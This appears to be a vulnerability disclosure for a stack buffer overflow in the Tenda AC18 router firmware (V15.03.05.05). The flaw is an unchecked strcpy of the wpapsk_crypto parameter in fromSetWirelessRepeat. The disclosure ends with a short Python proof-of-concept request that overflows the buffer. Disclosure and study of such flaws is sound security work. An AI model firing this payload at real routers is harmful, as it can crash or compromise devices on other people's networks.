## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `fromSetWirelessRepeat` function. The `v31` variable receives the `wpapsk_crypto` parameter from a POST request and is later assigned to the `v11` variable, which is fixed at 12 bytes. However, since the user can control the input of `wpapsk_crypto`, the statement `strcpy(v11, v31);` can cause a buffer overflow. The user-provided `wpapsk_crypto` can exceed the capacity of the `v11` array, triggering this security vulnerability.

![image-20240305220604598](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305220604598.png)

![image-20240305220617858](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305220617858.png)

The `v39` variable receives the `security` parameter from a POST request and we make it equal to "wpapsk".

![image-20240305221213155](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305221213155.png)

![image-20240305221252233](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305221252233.png)

![image-20240305220654018](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305220654018.png)

## PoC

```python
import requests

IP = '192.168.84.101'
url = f"http://{IP}/goform/WifiExtraSet?"
url += "wl_mode=0&security=wpapsk&wpapsk_key=aaaaaaa&wpapsk_crypto=" + "s" * 0x600

response = requests.get(url)
```

![image-20240305221659001](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305221659001.png)

